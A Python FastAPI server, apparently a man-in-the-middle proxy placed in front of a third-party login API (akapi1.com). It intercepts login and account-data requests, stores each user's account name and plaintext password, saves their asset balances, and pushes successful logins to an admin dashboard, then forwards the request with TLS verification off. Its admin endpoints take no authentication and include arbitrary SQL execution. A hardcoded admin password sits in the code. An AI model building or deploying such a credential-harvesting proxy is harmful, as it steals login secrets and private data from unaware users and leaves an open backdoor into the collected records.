# -*- coding: utf-8 -*-
"""
监控后端服务 - FastAPI
拦截登录请求并记录，提供管理API和WebSocket实时推送
"""

import asyncio
import json
import httpx
from datetime import datetime
from typing import List, Set
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import os
import sys
import io

# 修复Windows控制台中文乱码
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# 添加当前目录到路径
sys.path.insert(0, os.path.dirname(__file__))
from database import (
    init_db, record_login, get_all_users, get_all_ips, 
    get_recent_logins, get_user_detail, ban_user, unban_user,
    ban_ip, unban_ip, is_banned, get_ban_list, get_stats_summary,
    save_user_assets, get_user_assets, get_all_user_assets, get_asset_history,
    get_all_users_with_assets,
    get_all_tables, get_table_schema, query_table, insert_row, update_row, delete_row, execute_sql
)

# 配置
ADMIN_PASSWORD = "ak-lovejjy1314"  # 管理员密码
AKAPI_URL = "https://www.akapi1.com/RPC/"  # 原始API地址

app = FastAPI(title="AK代理监控系统")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# WebSocket连接管理 - 管理后台
class ConnectionManager:
    def __init__(self):
        self.active_connections: Set[WebSocket] = set()
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.add(websocket)
    
    def disconnect(self, websocket: WebSocket):
        self.active_connections.discard(websocket)
    
    async def broadcast(self, message: dict):
        """广播消息给所有连接"""
        dead_connections = set()
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                dead_connections.add(connection)
        
        # 清理断开的连接
        self.active_connections -= dead_connections

manager = ConnectionManager()

# 在线用户管理
class OnlineUserManager:
    def __init__(self):
        self.users: dict = {}  # username -> {websocket, page, user_agent, online_time, last_heartbeat}
        self.messages: dict = {}  # username -> [messages]
    
    async def user_online(self, username: str, websocket: WebSocket, page: str, user_agent: str):
        """用户上线"""
        self.users[username] = {
            'websocket': websocket,
            'page': page,
            'user_agent': user_agent,
            'online_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_heartbeat': datetime.now()
        }
        # 不广播 user_online 事件，避免实时日志噪音
        # 管理后台可以通过 /admin/api/online 主动查询在线用户
    
    def user_offline(self, username: str):
        """用户离线"""
        if username in self.users:
            del self.users[username]
    
    def update_heartbeat(self, username: str):
        """更新心跳"""
        if username in self.users:
            self.users[username]['last_heartbeat'] = datetime.now()
    
    def get_online_users(self):
        """获取在线用户列表"""
        now = datetime.now()
        online = []
        offline = []
        for username, data in self.users.items():
            # 超过60秒没心跳视为离线
            if (now - data['last_heartbeat']).seconds > 60:
                offline.append(username)
            else:
                online.append({
                    'username': username,
                    'page': data['page'],
                    'user_agent': data['user_agent'][:50] if data['user_agent'] else '',
                    'online_time': data['online_time']
                })
        # 清理离线用户
        for u in offline:
            del self.users[u]
        return online
    
    async def send_to_user(self, username: str, content: str, save_history: bool = True):
        """发送消息给用户"""
        if username in self.users:
            ws = self.users[username]['websocket']
            try:
                await ws.send_json({
                    'type': 'admin_message',
                    'content': content,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                # 只有一对一聊天才保存历史，群发消息不保存
                if save_history:
                    if username not in self.messages:
                        self.messages[username] = []
                    self.messages[username].append({
                        'content': content,
                        'is_admin': True,
                        'time': datetime.now().strftime('%H:%M:%S')
                    })
                return True
            except RuntimeError:
                print(f"用户 {username} 的WebSocket连接已关闭，无法发送消息。")
                return False
        return False
    
    def save_user_message(self, username: str, content: str):
        """保存用户消息"""
        if username not in self.messages:
            self.messages[username] = []
        self.messages[username].append({
            'content': content,
            'is_admin': False,
            'time': datetime.now().strftime('%H:%M:%S')
        })
    
    def get_messages(self, username: str):
        """获取消息历史"""
        return self.messages.get(username, [])[-50:]  # 最近50条

online_manager = OnlineUserManager()

# 初始化数据库
init_db()

# ===== 数据模型 =====
class LoginRequest(BaseModel):
    account: str
    password: str
    client: str = "WEB"

class BanRequest(BaseModel):
    value: str
    reason: str = None

class AdminAuth(BaseModel):
    password: str

# ===== 登录拦截代理 =====
@app.api_route("/RPC/Login", methods=["GET", "POST"])
async def proxy_login(request: Request):
    """拦截登录请求，记录后转发到原始服务器"""
    
    print("\n" + "="*60)
    print("[Login] 拦截到登录请求")
    print("="*60)
    
    # 获取客户端信息 - 优先从nginx代理头获取真实IP
    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    user_agent = request.headers.get("user-agent", "")
    content_type = request.headers.get("content-type", "")
    
    print(f"[Login] 完整URL: {request.url}")
    print(f"[Login] 路径: {request.url.path}")
    print(f"[Login] Method: {request.method}")
    print(f"[Login] Content-Type: {content_type}")
    print(f"[Login] Client IP: {client_ip}")
    print(f"[Login] User-Agent: {user_agent[:100] if user_agent else 'None'}")
    print(f"[Login] Query String: {request.url.query}")
    
    # 解析请求参数（支持多种格式）
    params = {}
    
    # 1. 先从 query string 获取
    for key, value in request.query_params.items():
        params[key] = value
    print(f"[Login] Query Params: {dict(request.query_params)}")
    
    # 2. 从请求体获取
    raw_body = None
    if request.method == "POST":
        try:
            raw_body = await request.body()
            print(f"[Login] Raw Body: {raw_body[:500] if raw_body else 'Empty'}")
        except Exception as e:
            print(f"[Login] 读取body失败: {e}")
        
        # 重新创建请求以便再次读取body
        from starlette.requests import Request as StarletteRequest
        
        try:
            if "application/json" in content_type:
                body = json.loads(raw_body) if raw_body else {}
                params.update(body)
                print(f"[Login] 解析为JSON: {body}")
            elif "application/x-www-form-urlencoded" in content_type:
                # 解析 form-urlencoded
                from urllib.parse import parse_qs
                form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
                for key, value in form_data.items():
                    params[key] = value[0] if value else ''
                print(f"[Login] 解析为Form: {params}")
            else:
                # 尝试解析为 JSON
                try:
                    body = json.loads(raw_body) if raw_body else {}
                    params.update(body)
                    print(f"[Login] 尝试JSON成功: {body}")
                except:
                    # 尝试解析为 form
                    try:
                        from urllib.parse import parse_qs
                        form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
                        for key, value in form_data.items():
                            params[key] = value[0] if value else ''
                        print(f"[Login] 尝试Form成功: {params}")
                    except Exception as e:
                        print(f"[Login] 解析失败: {e}")
        except Exception as e:
            print(f"[Login] 解析异常: {e}")
    
    account = params.get("account", "unknown")
    password = params.get("password", "")
    
    print(f"[Login] 最终解析结果: account={account}, password={'*'*len(password) if password else 'None'}")
    print(f"[Login] 所有参数keys: {list(params.keys())}")
    
    # 检查是否被封禁
    if is_banned(username=account, ip_address=client_ip):
        return JSONResponse({
            "Error": True,
            "Msg": "您的账号或IP已被封禁"
        })
    
    # 转发请求到原始服务器（保持原始格式）
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            # 构建转发请求
            if "application/json" in content_type:
                response = await client.post(
                    AKAPI_URL + "Login",
                    json=params,
                    headers={"User-Agent": user_agent, "Content-Type": "application/json"}
                )
            else:
                # 使用 form data 格式转发
                response = await client.post(
                    AKAPI_URL + "Login",
                    data=params,
                    headers={"User-Agent": user_agent}
                )
            result = response.json()
            print(f"[Login] 服务器响应: Error={result.get('Error')}, 有UserData={bool(result.get('UserData'))}")
        except Exception as e:
            print(f"[Login] 请求失败: {e}")
            return JSONResponse({
                "Error": True,
                "Msg": f"服务器连接失败: {str(e)}"
            })
    
    # 判断登录是否成功 - 检查Error字段
    is_success = result.get("Error") == False or (not result.get("Error") and result.get("UserData"))
    
    status = "success" if is_success else "failed"
    print(f"[Login] 登录结果: is_success={is_success}, status={status}")
    
    # 如果登录成功，从 UserData 中提取用户资产信息
    asset_data = None
    if is_success and result.get("UserData"):
        user_data = result["UserData"]
        asset_data = user_data
        print(f"[Login] 保存用户资产: {account}")
        try:
            save_user_assets(account, user_data)
            print(f"[Login] 资产保存成功")
        except Exception as e:
            print(f"[Login] 资产保存失败: {e}")
    
    # 记录所有登录尝试到user_stats表（成功和失败都记录，用于"用户使用情况"）
    if account and password:
        print(f"[Login] 记录登录尝试: account={account}, is_success={is_success}")
        try:
            record_login(
                username=account,
                ip_address=client_ip,
                user_agent=user_agent,
                request_path="/RPC/Login",
                status_code=200 if is_success else 401,
                extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")}),
                password=password,
                is_success=is_success
            )
            print(f"[Login] 登录记录保存成功")
        except Exception as e:
            print(f"[Login] 登录记录保存失败: {e}")
    else:
        print(f"[Login] 跳过记录（无效请求：account={account}）")
    
    # 只有真正的登录尝试（有账号密码的请求）才广播，且只广播成功的登录
    if account and password and is_success:
        broadcast_data = {
            "type": "new_login",
            "data": {
                "username": account,
                "ip": client_ip,
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "success",
                "user_agent": user_agent[:50] if user_agent else ""
            }
        }
        
        # 如果有资产数据，一起广播
        if asset_data:
            broadcast_data["data"]["assets"] = {
                "ep": asset_data.get("EP", 0),
                "sp": asset_data.get("SP", 0),
                "tp": asset_data.get("TP", 0),
                "rp": asset_data.get("RP", 0),
                "ace_count": asset_data.get("ACECount", 0),
                "total_ace": asset_data.get("TotalACE", 0),
                "honor_name": asset_data.get("HonorName", ""),
                "weekly_money": asset_data.get("WeeklyMoney", 0)
            }
        
        print(f"[Login] 广播登录成功事件: {account}")
        await manager.broadcast(broadcast_data)
    else:
        print(f"[Login] 跳过广播（account={account}, password={'***' if password else 'None'}, is_success={is_success}）")
    
    # 创建响应，如果登录成功则设置cookie保存用户名
    response = JSONResponse(result)
    if is_success:
        # 设置cookie，聊天组件可以读取这个来获取用户名
        response.set_cookie(
            key="ak_username",
            value=account,
            max_age=86400 * 30,  # 30天
            httponly=False,  # 允许JS读取
            samesite="lax"
        )
        print(f"[Login] 登录成功，设置cookie: ak_username={account}")
    
    return response

# ===== public_IndexData 拦截 (获取用户资产) =====
@app.api_route("/RPC/public_IndexData", methods=["GET", "POST"])
async def proxy_index_data(request: Request):
    """拦截用户资产数据请求，保存后返回"""
    
    print("\n" + "="*60)
    print("[IndexData] 拦截到资产数据请求")
    print("="*60)
    
    # 获取客户端信息 - 优先从nginx代理头获取真实IP
    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    user_agent = request.headers.get("user-agent", "")
    content_type = request.headers.get("content-type", "")
    
    print(f"[IndexData] Method: {request.method}")
    print(f"[IndexData] Content-Type: {content_type}")
    print(f"[IndexData] Client IP: {client_ip}")
    print(f"[IndexData] Query String: {request.url.query}")
    
    # 解析请求参数（支持多种格式）- 完全照抄登录API的逻辑
    params = {}
    
    # 1. 先从 query string 获取
    for key, value in request.query_params.items():
        params[key] = value
    print(f"[IndexData] Query Params: {dict(request.query_params)}")
    
    # 2. 从请求体获取
    raw_body = None
    if request.method == "POST":
        try:
            raw_body = await request.body()
            print(f"[IndexData] Raw Body: {raw_body[:500] if raw_body else 'Empty'}")
        except Exception as e:
            print(f"[IndexData] 读取body失败: {e}")
        
        # 重新创建请求以便再次读取body
        from starlette.requests import Request as StarletteRequest
        
        try:
            if "application/json" in content_type:
                body = json.loads(raw_body) if raw_body else {}
                params.update(body)
                print(f"[IndexData] 解析为JSON: {body}")
            elif "application/x-www-form-urlencoded" in content_type:
                # 解析 form-urlencoded
                from urllib.parse import parse_qs
                form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
                for key, value in form_data.items():
                    params[key] = value[0] if value else ''
                print(f"[IndexData] 解析为Form: {params}")
            else:
                # 尝试解析为 JSON
                try:
                    body = json.loads(raw_body) if raw_body else {}
                    params.update(body)
                    print(f"[IndexData] 尝试JSON成功: {body}")
                except:
                    # 尝试解析为 form
                    try:
                        from urllib.parse import parse_qs
                        form_data = parse_qs(raw_body.decode('utf-8') if raw_body else '')
                        for key, value in form_data.items():
                            params[key] = value[0] if value else ''
                        print(f"[IndexData] 尝试Form成功: {params}")
                    except Exception as e:
                        print(f"[IndexData] 解析失败: {e}")
        except Exception as e:
            print(f"[IndexData] 解析异常: {e}")
    
    print(f"[IndexData] 最终解析结果: {params}")
    print(f"[IndexData] 所有参数keys: {list(params.keys())}")
    
    # 转发请求到原始服务器 - 完全照抄登录API的逻辑
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            # 构建转发请求
            if "application/json" in content_type:
                response = await client.post(
                    AKAPI_URL + "public_IndexData",
                    json=params,
                    headers={"User-Agent": user_agent, "Content-Type": "application/json"}
                )
            else:
                # 使用 form data 格式转发
                response = await client.post(
                    AKAPI_URL + "public_IndexData",
                    data=params,
                    headers={"User-Agent": user_agent}
                )
            result = response.json()
            print(f"[IndexData] 服务器响应: Error={result.get('Error')}, 有Data={bool(result.get('Data'))}")
        except Exception as e:
            print(f"[IndexData] 请求失败: {e}")
            return JSONResponse({
                "Error": True,
                "Msg": f"服务器连接失败: {str(e)}"
            })
    
    # 如果成功获取数据，先保存到数据库再返回给客户端
    if not result.get("Error") and result.get("Data"):
        data = result["Data"]
        
        print(f"[IndexData] 收到有效数据，尝试获取用户名...")
        print(f"[IndexData] 请求参数: {params}")
        print(f"[IndexData] 客户端IP: {client_ip}")
        
        # 尝试多种方式获取用户名
        username = None
        
        # 方式1: 从请求参数获取 (可能是account, UserID, key等)
        if params:
            username = params.get("account") or params.get("Account") or params.get("UserName") or params.get("username")
            if username:
                print(f"[IndexData] 从请求参数获取到用户名: {username}")
        
        # 方式2: 从返回数据中获取用户名
        if not username and data:
            username = data.get("UserName") or data.get("Account") or data.get("NickName")
            if username:
                print(f"[IndexData] 从返回数据获取到用户名: {username}")
        
        # 方式3: 从最近登录记录中查找该IP的用户
        if not username:
            print(f"[IndexData] 尝试从登录记录中通过IP查找用户...")
            recent = get_recent_logins(limit=50)
            for login in recent:
                login_ip = login.get("ip_address", "")
                login_user = login.get("username", "")
                if login_ip == client_ip and login_user and login_user != "unknown":
                    username = login_user
                    print(f"[IndexData] 通过IP匹配找到用户: {username} (IP: {login_ip})")
                    break
            if not username:
                print(f"[IndexData] 未能通过IP找到用户，最近登录IP列表: {[l.get('ip_address') for l in recent[:5]]}")
        
        if username and username != "unknown":
            # 检查数据结构，看是否包含资产信息
            print(f"[IndexData] 用户: {username}")
            print(f"[IndexData] 数据字段: {list(data.keys())}")
            print(f"[IndexData] 是否包含ACECount: {'ACECount' in data}")
            print(f"[IndexData] 是否包含EP: {'EP' in data}")
            
            # 只有包含资产字段时才保存
            if 'ACECount' in data or 'EP' in data:
                print(f"[IndexData] 发现资产数据，保存到数据库")
                save_user_assets(username, data)
            else:
                print(f"[IndexData] 这是用户资料数据，不是资产数据，跳过保存")
            
            # 广播资产更新事件（包含所有点数）
            await manager.broadcast({
                "type": "asset_update",
                "data": {
                    "username": username,
                    "ace_count": data.get("ACECount", 0),
                    "total_ace": data.get("TotalACE", 0),
                    "ep": data.get("EP", 0),
                    "sp": data.get("SP", 0),
                    "rp": data.get("RP", 0),
                    "tp": data.get("TP", 0),
                    "weekly_money": data.get("WeeklyMoney", 0),
                    "rate": data.get("Rate", 0),
                    "honor_name": data.get("HonorName", ""),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            })
    
    # 返回给客户端
    return JSONResponse(result)

# ===== 其他RPC请求代理 =====
@app.api_route("/RPC/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def proxy_rpc(path: str, request: Request):
    """代理其他RPC请求"""
    
    # 优先从nginx代理头获取真实IP
    client_ip = request.headers.get("x-real-ip") or request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    
    # 检查IP封禁
    if is_banned(ip_address=client_ip):
        return JSONResponse({
            "Error": True,
            "Msg": "您的IP已被封禁"
        })
    
    # 获取请求体
    body = None
    if request.method in ["POST", "PUT"]:
        try:
            body = await request.json()
        except:
            body = await request.body()
    
    # 转发请求
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            response = await client.request(
                method=request.method,
                url=AKAPI_URL + path,
                json=body if isinstance(body, dict) else None,
                content=body if isinstance(body, bytes) else None,
                headers={
                    "User-Agent": request.headers.get("user-agent", ""),
                    "Content-Type": request.headers.get("content-type", "application/json"),
                    "Accept": request.headers.get("accept", "*/*")
                }
            )
            return JSONResponse(
                content=response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text,
                status_code=response.status_code
            )
        except Exception as e:
            return JSONResponse({
                "Error": True,
                "Msg": f"请求失败: {str(e)}"
            }, status_code=500)

# ===== 管理API =====

@app.post("/admin/api/login")
async def admin_login(request: Request):
    """管理员登录验证"""
    data = await request.json()
    password = data.get('password')
    
    if password == ADMIN_PASSWORD:
        # 生成简单token（实际项目应使用JWT）
        import hashlib
        import time
        token = hashlib.sha256(f"{password}{time.time()}".encode()).hexdigest()[:32]
        return {"success": True, "token": token}
    else:
        return {"success": False, "message": "密码错误"}

@app.get("/admin/api/stats")
async def get_stats():
    """获取统计摘要"""
    return get_stats_summary()

@app.get("/admin/api/users")
async def get_users(limit: int = 100, offset: int = 0):
    """获取用户列表（包含资产信息）"""
    return get_all_users_with_assets(limit, offset)

@app.get("/admin/api/ips")
async def get_ips(limit: int = 100, offset: int = 0):
    """获取IP列表"""
    return get_all_ips(limit, offset)

@app.get("/admin/api/logins")
async def get_logins(limit: int = 50):
    """获取最近登录记录"""
    return get_recent_logins(limit)

@app.get("/admin/api/user/{username}")
async def get_user(username: str):
    """获取用户详情"""
    user = get_user_detail(username)
    if not user:
        raise HTTPException(status_code=404, detail="用户不存在")
    return user

@app.get("/admin/api/banlist")
async def get_banlist():
    """获取封禁列表"""
    return get_ban_list()

@app.get("/admin/api/assets")
async def get_assets(limit: int = 100, offset: int = 0):
    """获取所有用户资产列表"""
    return get_all_user_assets(limit, offset)

@app.get("/admin/api/assets/{username}")
async def get_user_asset(username: str):
    """获取指定用户资产"""
    assets = get_user_assets(username)
    if not assets:
        raise HTTPException(status_code=404, detail="用户资产不存在")
    assets['history'] = get_asset_history(username)
    return assets

@app.post("/admin/api/ban/user")
async def ban_user_api(req: BanRequest):
    """封禁用户"""
    ban_user(req.value, req.reason)
    await manager.broadcast({
        "type": "user_banned",
        "data": {"username": req.value, "reason": req.reason}
    })
    return {"success": True, "message": f"用户 {req.value} 已被封禁"}

@app.post("/admin/api/unban/user")
async def unban_user_api(req: BanRequest):
    """解封用户"""
    unban_user(req.value)
    await manager.broadcast({
        "type": "user_unbanned",
        "data": {"username": req.value}
    })
    return {"success": True, "message": f"用户 {req.value} 已解封"}

@app.post("/admin/api/ban/ip")
async def ban_ip_api(req: BanRequest):
    """封禁IP"""
    ban_ip(req.value, req.reason)
    await manager.broadcast({
        "type": "ip_banned",
        "data": {"ip": req.value, "reason": req.reason}
    })
    return {"success": True, "message": f"IP {req.value} 已被封禁"}

@app.post("/admin/api/unban/ip")
async def unban_ip_api(req: BanRequest):
    """解封IP"""
    unban_ip(req.value)
    await manager.broadcast({
        "type": "ip_unbanned",
        "data": {"ip": req.value}
    })
    return {"success": True, "message": f"IP {req.value} 已解封"}

@app.post("/admin/api/change_password")
async def change_password_api(request: Request):
    """修改管理员密码"""
    global ADMIN_PASSWORD
    data = await request.json()
    current = data.get('current_password')
    new_pwd = data.get('new_password')
    
    if current != ADMIN_PASSWORD:
        return {"success": False, "message": "当前密码错误"}
    
    if not new_pwd or len(new_pwd) < 6:
        return {"success": False, "message": "新密码至少需要6位"}
    
    # 更新内存中的密码
    ADMIN_PASSWORD = new_pwd
    
    # 更新server.py文件中的密码
    try:
        import re
        server_path = os.path.join(os.path.dirname(__file__), "server.py")
        with open(server_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = re.sub(
            r'ADMIN_PASSWORD\s*=\s*"[^"]*"',
            f'ADMIN_PASSWORD = "{new_pwd}"',
            content
        )
        
        with open(server_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return {"success": True, "message": "密码修改成功"}
    except Exception as e:
        return {"success": False, "message": f"保存失败: {str(e)}"}

# ===== WebSocket - 管理后台 =====
@app.websocket("/admin/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket实时推送"""
    await manager.connect(websocket)
    try:
        while True:
            # 保持连接，等待消息
            data = await websocket.receive_text()
            # 可以处理客户端发来的消息
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# ===== WebSocket - 用户聊天 =====
@app.websocket("/chat/ws")
async def chat_websocket(websocket: WebSocket):
    """用户聊天WebSocket"""
    await websocket.accept()
    
    # 获取用户名
    username = websocket.query_params.get('username', 'visitor')
    print(f"[ChatWS] 新WebSocket连接: username={username}, ws_id={id(websocket)}")
    
    try:
        while True:
            data = await websocket.receive_json()
            msg_type = data.get('type')
            print(f"[ChatWS] 收到消息: type={msg_type}, username={username}, ws_id={id(websocket)}")
            
            if msg_type == 'online':
                # 用户上线
                await online_manager.user_online(
                    data.get('username', username),
                    websocket,
                    data.get('page', ''),
                    data.get('userAgent', '')
                )
                username = data.get('username', username)
                # 发送历史消息
                history = online_manager.get_messages(username)
                if history:
                    await websocket.send_json({
                        'type': 'history',
                        'messages': history
                    })
            
            elif msg_type == 'heartbeat':
                # 心跳
                online_manager.update_heartbeat(username)
            
            elif msg_type == 'user_message':
                # 用户发送消息
                content = data.get('content', '')
                print(f"[ChatWS] 收到用户消息: username={username}, content={content}, ws_id={id(websocket)}")
                if content:
                    online_manager.save_user_message(username, content)
                    # 广播给管理后台
                    broadcast_data = {
                        'type': 'chat_message',
                        'data': {
                            'username': username,
                            'content': content,
                            'time': datetime.now().strftime('%H:%M:%S'),
                            'is_admin': False
                        }
                    }
                    print(f"[ChatWS] 广播用户消息给管理后台: {broadcast_data}")
                    await manager.broadcast(broadcast_data)
            
            elif msg_type == 'offline':
                # 用户离线
                online_manager.user_offline(username)
                await manager.broadcast({
                    'type': 'user_offline',
                    'data': {'username': username}
                })
                break
                
    except WebSocketDisconnect:
        online_manager.user_offline(username)
        await manager.broadcast({
            'type': 'user_offline',
            'data': {'username': username}
        })

# ===== 在线用户API =====
@app.get("/admin/api/online")
async def get_online_users():
    """获取在线用户列表"""
    return online_manager.get_online_users()

@app.post("/admin/api/chat/send")
async def send_chat_message(request: Request):
    """发送消息给用户"""
    data = await request.json()
    username = data.get('username')
    content = data.get('content')
    
    if not username or not content:
        raise HTTPException(status_code=400, detail="缺少参数")
    
    success = await online_manager.send_to_user(username, content)
    if success:
        # 广播给管理后台
        await manager.broadcast({
            'type': 'chat_message',
            'data': {
                'username': username,
                'content': content,
                'time': datetime.now().strftime('%H:%M:%S'),
                'is_admin': True
            }
        })
        return {"success": True}
    else:
        raise HTTPException(status_code=404, detail="用户不在线")

@app.get("/admin/api/chat/history/{username}")
async def get_chat_history(username: str):
    """获取聊天历史"""
    return online_manager.get_messages(username)

@app.post("/admin/api/chat/broadcast")
async def broadcast_chat_message(request: Request):
    """群发消息给所有在线用户"""
    data = await request.json()
    content = data.get('content')
    
    if not content:
        raise HTTPException(status_code=400, detail="缺少消息内容")
    
    # 获取所有在线用户并发送（群发消息不保存到个人聊天历史）
    online_users = online_manager.get_online_users()
    sent_count = 0
    
    for user in online_users:
        username = user.get('username')
        if username:
            success = await online_manager.send_to_user(username, content, save_history=False)
            if success:
                sent_count += 1
    
    # 广播给管理后台
    await manager.broadcast({
        'type': 'broadcast_message',
        'data': {
            'content': content,
            'time': datetime.now().strftime('%H:%M:%S'),
            'sent_count': sent_count
        }
    })
    
    return {"success": True, "sent_count": sent_count}

# ===== 数据库管理API =====
@app.get("/admin/api/db/tables")
async def get_tables():
    """获取所有表名"""
    return get_all_tables()

@app.get("/admin/api/db/schema/{table_name}")
async def get_schema(table_name: str):
    """获取表结构"""
    return get_table_schema(table_name)

@app.get("/admin/api/db/query/{table_name}")
async def query_data(table_name: str, limit: int = 100, offset: int = 0, order_by: str = None, order_desc: bool = True):
    """查询表数据"""
    return query_table(table_name, limit, offset, order_by, order_desc)

@app.post("/admin/api/db/insert/{table_name}")
async def insert_data(table_name: str, request: Request):
    """插入数据"""
    data = await request.json()
    try:
        row_id = insert_row(table_name, data)
        return {"success": True, "id": row_id}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.put("/admin/api/db/update/{table_name}")
async def update_data(table_name: str, request: Request):
    """更新数据"""
    data = await request.json()
    pk_column = data.pop('_pk_column', 'id')
    pk_value = data.pop('_pk_value', None)
    if pk_value is None:
        raise HTTPException(status_code=400, detail="缺少主键值")
    try:
        affected = update_row(table_name, pk_column, pk_value, data)
        return {"success": True, "affected_rows": affected}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.delete("/admin/api/db/delete/{table_name}")
async def delete_data(table_name: str, pk_column: str = "id", pk_value: str = None):
    """删除数据"""
    if pk_value is None:
        raise HTTPException(status_code=400, detail="缺少主键值")
    try:
        affected = delete_row(table_name, pk_column, pk_value)
        return {"success": True, "affected_rows": affected}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/admin/api/db/sql")
async def run_sql(request: Request):
    """执行自定义SQL"""
    data = await request.json()
    sql = data.get('sql', '')
    if not sql:
        raise HTTPException(status_code=400, detail="缺少SQL语句")
    try:
        result = execute_sql(sql)
        return {"success": True, "result": result}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

# ===== 管理后台页面 =====
@app.get("/admin", response_class=HTMLResponse)
@app.get("/admin/", response_class=HTMLResponse)
async def admin_page():
    """管理后台页面"""
    html_path = os.path.join(os.path.dirname(__file__), "admin.html")
    if os.path.exists(html_path):
        with open(html_path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>管理页面未找到</h1>"

# ===== 聊天组件JS =====
from fastapi.responses import Response

@app.get("/chat/widget.js")
async def chat_widget_js():
    """返回聊天组件JS"""
    js_path = os.path.join(os.path.dirname(__file__), "chat_widget.js")
    if os.path.exists(js_path):
        with open(js_path, "r", encoding="utf-8") as f:
            return Response(content=f.read(), media_type="application/javascript")
    return Response(content="// Chat widget not found", media_type="application/javascript")

# ===== 启动 =====
def run_server(host="0.0.0.0", port=8080):
    """启动服务器"""
    print(f"""
╔══════════════════════════════════════════════════════════╗
║           AK代理监控系统 已启动                           ║
╠══════════════════════════════════════════════════════════╣
║  管理后台: http://{host}:{port}/admin                     
║  API文档:  http://{host}:{port}/docs                      
║  WebSocket: ws://{host}:{port}/admin/ws                   
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host=host, port=port)

if __name__ == "__main__":
    run_server()
